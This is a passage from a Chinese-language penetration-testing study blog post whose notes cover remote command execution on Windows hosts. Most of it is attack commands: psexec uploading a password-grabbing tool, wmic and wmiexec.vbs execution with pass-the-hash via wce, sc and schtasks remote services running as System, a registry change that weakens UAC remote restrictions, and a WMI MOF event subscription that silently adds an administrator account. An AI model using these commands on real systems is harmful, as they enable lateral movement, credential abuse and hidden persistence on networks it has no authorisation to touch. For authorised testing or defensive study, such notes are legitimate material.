<p><strong>at过去后如果找不到网络路径,则判断是目标主机已禁用Task Scheduler服务</strong></p>
<p>####psexec<br>第一次运行会弹框,输入–accepteula这个参数就可以绕过  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.exe \\ip –accepteula -u username -p password program.exe</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/6/1.jpg" alt></p>
<p>另外两个比较重要的参数  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）</span><br><span class="line">-d 不等待程序执行完就返回</span><br><span class="line">比如想上传一个本地的getpass到你远程连接的服务器上去:</span><br><span class="line">Psexec.exe \\ip –u user –p pass –c c:\getpass.exe –d</span><br></pre></td></tr></table></figure>

<p>另外学习一波pstools的一些运用：<br><a href="http://blog.csdn.net/sysprogram/article/details/13001781" target="_blank" rel="noopener">http://blog.csdn.net/sysprogram/article/details/13001781</a></p>
<p><strong>如果出现找不到网络名，判断目标主机已禁用ADMIN$共享</strong></p>
<p>####wmic<br>net use后：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy 1.bat \\host\c$\windows\temp\1.bat</span><br><span class="line"></span><br><span class="line">wmic /node:ip /user:test /password:testtest process call create c:\windows\temp\1.bat</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/6/2.jpg" alt></p>
<p>ps:<br>如果出现User credentials cannot be used for local connections,应该是调用了calc.exe权限不够的问题<br>如果出现Description = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断WMI服务被禁用  </p>
<p>####wmiexec.vbs  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、半交互模式</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell ip username password</span><br><span class="line">2、单命令执行</span><br><span class="line">cscript.exe wmiexec.vbs /cmd ip username password &quot;command&quot;</span><br><span class="line">3、wce_hash注入</span><br><span class="line">如果抓取的LM hash是AAD3开头的，或者是No Password之类的，就用32个0代替LM hash</span><br><span class="line">wce -s hash</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell ip</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/6/3.jpg" alt><br>wmi只是创建进程,没办法去判断一个进程是否执行完成(比如ping),这样就导致wmi.dll删除不成,下一次又是被占用,这时候修改一下vbs里面的名字就好：<code>Const FileName = &quot;wmi1.dll&quot;</code>,也可以加入<code>-persist</code>参数(后台运行)</p>
<p>另外有一个uac问题<br><strong>非域用户</strong>登陆到win08和2012中,只有administrator可以登陆成功,其他管理员账号会出现WMIEXEC ERROR: Access is denied<br>需要在win08或者2012上面执行,然后才可以连接:  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/6/4.jpg" alt></p>
<p>想更详细了解的可以看看：<a href="https://www.91ri.org/12908.html" target="_blank" rel="noopener">https://www.91ri.org/12908.html</a></p>
<p>####smbexec<br>这个可以根据其他共享(c$、ipc$)来获取一个cmd  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先把execserver.exe复制到目标的windows目录下,然后本机执行</span><br><span class="line">test.exe ip user pass command sharename</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/6/5.jpg" alt></p>
<p>####powershell remoting<br>感觉实质上还是操作wmi实现的一个执行程序</p>
<p><a href="https://github.com/samratashok/nishang/blob/5da8e915fcd56fc76fc16110083948e106486af0/Shells/Invoke-PowerShellWmi.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/5da8e915fcd56fc76fc16110083948e106486af0/Shells/Invoke-PowerShellWmi.ps1</a></p>
<p>####SC创建服务执行<br>一定要注意的是binpath这些设置的后面是有一个<strong>空格</strong>的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、系统权限(其中test为服务名)</span><br><span class="line">sc \\DC1 create test binpath= c:\cmd.exe</span><br><span class="line">sc \\DC1 start test</span><br><span class="line">sc \\DC1 delete test</span><br><span class="line"></span><br><span class="line">2.指定用户权限启动</span><br><span class="line">sc \\DC1 create test binpath = &quot;c:\1.exe&quot; obj= &quot;centoso\administrator&quot; passwrod= test</span><br><span class="line">sc \\DC1 start test</span><br></pre></td></tr></table></figure>

<p>####schtasks<br>schtasks计划任务远程运行  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令原型：</span><br><span class="line">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru &#123;[Domain\]User | &quot;System&quot;&#125; [/rp Password]] /?</span><br><span class="line"></span><br><span class="line">For example:</span><br><span class="line">schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System</span><br><span class="line">schtasks /run /tn foobar /S host</span><br><span class="line">schtasks /F /delete /tn foobar /S host</span><br></pre></td></tr></table></figure>

<p>验证失败：win03连到08,xp连到08,xp连到03(但是并没有真正的成功执行,不知道是不是有姿势错了)<br><img src="/sourcepictures/2017/11/06/6/6.jpg" alt></p>
<p>更多用法：<a href="http://www.feiesoft.com/windows/cmd/schtasks.htm" target="_blank" rel="noopener">http://www.feiesoft.com/windows/cmd/schtasks.htm</a></p>
<p>####SMB+MOF || DLL Hijacks<br>其实这个思路一般都有用到的,比如在mof提权(上传mof文件到c:/windows/system32/wbem/mof/mof.mof)中,lpk_dll劫持<br>不过测试添加账号成功…执行文件缺失败了  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin adminaz1 /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>####PTH + compmgmt.msc</p>
<p><img src="/sourcepictures/2017/11/06/6/7.jpg" alt></p>
<p><a href="http://drops.wooyun.org/tips/7358" target="_blank" rel="noopener">http://drops.wooyun.org/tips/7358</a></p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/Network-Security/">Network Security</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Pentest/">Pentest</a>
  </div>

</div>


	<div class="article-share" id="share">
	
	  <div data-url="http://flamepeak.com/2017/11/06/Pentest-study-20171106/" data-title="渗透测试学习与总结 | FlamePeak" data-tsina="null" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2017/11/13/Chrome-Install-in-Linux-20171113/" title="Chrome Install in Linux">
  <strong>上一篇：</strong><br/>
  <span>
  Chrome Install in Linux</span>
</a>
</div>


<div class="next">
<a href="/2017/09/20/python-json-dumps-problems/"  title="python中json使用遇到一些编码问题">
 <strong>下一篇：</strong><br/> 
 <span>python中json使用遇到一些编码问题
</span>
</a>
</div>

</nav>

	

</div>  

      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
 
 <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#域用户hash抓取"><span class="toc-number">1.</span> <span class="toc-text">域用户hash抓取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程连接-amp-amp-执行程序"><span class="toc-number"></span> <span class="toc-text">远程连接&amp;&amp;执行程序</span></a>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  


  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
		  
			<li><a href="/categories/Android/" title="Android">Android<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/Cryptography/" title="Cryptography">Cryptography<sup>15</sup></a></li>
		  
		
		  
			<li><a href="/categories/Hardware/" title="Hardware">Hardware<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/Life/" title="Life">Life<sup>4</sup></a></li>
		  
		
		  
			<li><a href="/categories/Linux/" title="Linux">Linux<sup>43</sup></a></li>
		  
		
		  
			<li><a href="/categories/Network-Security/" title="Network Security">Network Security<sup>19</sup></a></li>
		  
		
		  
			<li><a href="/categories/Python/" title="Python">Python<sup>39</sup></a></li>
		  
		
		  
			<li><a href="/categories/Tools/" title="Tools">Tools<sup>18</sup></a></li>
		  
		
		  
			<li><a href="/categories/Web前端/" title="Web前端">Web前端<sup>20</sup></a></li>
		  
		
		  
			<li><a href="/categories/Web后端/" title="Web后端">Web后端<sup>13</sup></a></li>
		  
		
		  
			<li><a href="/categories/人工智能/" title="人工智能">人工智能<sup>7</sup></a></li>
		  
		
		  
			<li><a href="/categories/百家杂谈/" title="百家杂谈">百家杂谈<sup>21</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/Python/" title="Python">Python<sup>42</sup></a></li>
			
		
			
				<li><a href="/tags/Linux/" title="Linux">Linux<sup>33</sup></a></li>
			
		
			
				<li><a href="/tags/C/" title="C">C<sup>21</sup></a></li>
			
		
			
				<li><a href="/tags/笔记/" title="笔记">笔记<sup>18</sup></a></li>
			
		
			
				<li><a href="/tags/Hexo/" title="Hexo">Hexo<sup>10</sup></a></li>
			
		
			
				<li><a href="/tags/cryptography/" title="cryptography">cryptography<sup>10</sup></a></li>
			
		
			
				<li><a href="/tags/Life/" title="Life">Life<sup>9</sup></a></li>
			
		
			
				<li><a href="/tags/JavaScript/" title="JavaScript">JavaScript<sup>9</sup></a></li>
			
		
			
				<li><a href="/tags/MongoDB/" title="MongoDB">MongoDB<sup>7</sup></a></li>
			
		
			
				<li><a href="/tags/Network-Security/" title="Network Security">Network Security<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/Mysql/" title="Mysql">Mysql<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/Kali/" title="Kali">Kali<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/Scrapy/" title="Scrapy">Scrapy<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/VPN/" title="VPN">VPN<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/Tools/" title="Tools">Tools<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/Docker/" title="Docker">Docker<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/读书/" title="读书">读书<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/EFI/" title="EFI">EFI<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/人生/" title="人生">人生<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/WikiLeaks/" title="WikiLeaks">WikiLeaks<sup>3</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
        
          <li>
            
            	<a href="https://laod.cn/hosts/2017-google-hosts.html" target="_blank" title="Google Hosts">Google Hosts</a>
            
          </li>
        
          <li>
            
            	<a href="http://overapi.com" target="_blank" title="OverAPI">OverAPI</a>
            
          </li>
        
          <li>
            
            	<a href="https://devdocs.io" target="_blank" title="DevDocs">DevDocs</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
</div>

</aside>
</div>

    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> 善良   善学   勇敢   坚毅 <br/>
			努力   克制   谦虚   执着</p>
	</section>
	 
	<div id="social-font" class="clearfix">
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">Hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2020 
		
		<a href="/about" target="_blank" title="FlamePeak">FlamePeak</a>
		
		





		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
        getSize();
        if (myWidth >= 1024) {
          $('#toc.toc-aside').css('display', 'block');
          c.click();
        }
  
  $(window).resize(function(){
    getSize();
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
      
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<div class="hoverqrcode clearfix"></div>',
  '<a class="overlay" id="qrcode"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);

  $('.hoverqrcode').hide();

  var myWidth = 0;
  function updatehoverqrcode(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
    var qrsize = myWidth > 1024 ? 200:100;
    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
    var p = $('.article-share-qrcode').position();
    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
                          .qrcode(options);
  };
  $(window).resize(function(){
    $('.hoverqrcode').hide();
  });
  $('.article-share-qrcode').click(function(){
    updatehoverqrcode();
    $('.hoverqrcode').toggle();
  });
  $('.article-share-qrcode').hover(function(){}, function(){
      $('.hoverqrcode').hide();
  });
});
</script>











<!-- Analytics Begin -->
<!--%- partial('analytics') %-->
<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>

